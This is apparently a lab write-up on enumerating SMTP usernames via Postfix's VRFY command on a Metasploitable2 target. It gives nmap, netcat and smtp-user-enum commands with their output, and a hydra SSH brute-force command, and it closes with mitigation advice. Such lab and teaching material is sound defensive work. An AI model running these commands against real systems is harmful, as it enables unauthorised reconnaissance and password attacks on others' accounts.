# SMTP Enumeration (Port 25) – Postfix VRFY User Discovery

## 📌 Overview

This write-up demonstrates how to enumerate valid usernames from an SMTP service running on port 25 using the `VRFY` command. The target was found to be running **Postfix SMTP**, which allows user validation via VRFY—an information disclosure weakness that can assist in further attacks like brute-force login attempts.

---

## 🎯 Objective

* Identify valid system users via SMTP
* Prepare usernames for further attacks (SSH, Telnet, etc.)

---


## 🔍 Step 1: Service Enumeration with Nmap

### Command:

```bash
nmap -sC -sV -p 25 <Target-IP>
```

<img width="1193" height="580" alt="1 scan" src="https://github.com/user-attachments/assets/e3a1354b-0ea7-477d-8926-705d4a483b77" />

### Explanation:

* `-sC` → Runs default NSE scripts
* `-sV` → Detects service versions
* `-p 25` → Scans SMTP port

### Result:

* SMTP service identified as **Postfix**
* VRFY command found to be enabled

---

## 📡 Step 2: Manual Interaction with SMTP (Netcat)

### Connect to SMTP:

```bash
nc <Target-IP> 25
```

### Interaction:

```bash
HELO attacker
```

### Response:

```
250 metasploitable.localdomain
```

### Explanation:

* `HELO attacker` → Initiates SMTP session and identifies the client
* Server responds with hostname → confirms service is active

---

## 👤 Step 3: User Enumeration via VRFY

### Commands & Results:

```bash
VRFY root
```

```
252 2.0.0 root
```

```bash
VRFY admin
```

```
550 5.1.1 User unknown
```

```bash
VRFY user
```

```
252 2.0.0 user
```

### Explanation:

* `VRFY <username>` → Checks if a user exists
* `252` → User exists (but server won't fully confirm mailbox)
* `550` → User does not exist

### ✔ Valid Users Identified:

* `root`
* `user`

<img width="668" height="423" alt="2 smtp-enumration" src="https://github.com/user-attachments/assets/5a5e7473-139b-427d-9174-18e881593f12" />

---

## ⚙️ Step 4: Automated Enumeration (smtp-user-enum)

### Create a custom user list:

```bash
nano user.txt
```

### Example content:

```
admin
root
kitten
user
admin
hello
msfadmin
```

<img width="697" height="510" alt="3 user txt" src="https://github.com/user-attachments/assets/05b1d5f7-f059-48c7-a591-fe269ecbb4d1" />

---

### Run Enumeration:

```bash
smtp-user-enum -M VRFY -U userlist.txt -t <Target-IP>
```

### Output:

```
root exists
user exists
msfadmin exists
```

<img width="695" height="564" alt="4 smtp-tool" src="https://github.com/user-attachments/assets/6a74fc86-ed9c-428b-9ddf-b619f8b96a0c" />

### Explanation:

* `-M VRFY` → Uses VRFY method
* `-U` → Specifies username list
* `-t` → Target IP

---

## 🚀 Step 5: Next Steps (Post Enumeration)

The discovered usernames can now be used for:

### 🔐 Brute-force attacks:

* SSH (`hydra`, `medusa`)
* Telnet
* FTP (if available)

Example:

```bash
hydra -l root -P passwords.txt ssh://<Target-IP>
```

---

## ⬆️ Step 6: Privilege Escalation

Once access is gained using valid credentials, privilege escalation can be performed.

➡️ Follow the steps here:
**[Link](https://github.com/ctrl-sid2099/VulnHub-Writeups/tree/main/Metasploitable2/OpenSSH-4.7p1#-step-5-searching-for-suid-binaries)**

---

## 🧠 Key Takeaways

* SMTP VRFY can leak valid usernames
* Even partial confirmation (`252`) is useful
* Username enumeration is critical for credential attacks
* Always combine enumeration with further exploitation

---

## ⚠️ Mitigation

* Disable VRFY in Postfix configuration:

```bash
disable_vrfy_command = yes
```

* Restrict SMTP access via firewall
* Monitor unusual SMTP activity

---

## 📎 Conclusion

SMTP enumeration via VRFY is a simple yet powerful technique. When misconfigured, it provides attackers with valid usernames, significantly increasing the success rate of brute-force and credential-based attacks.

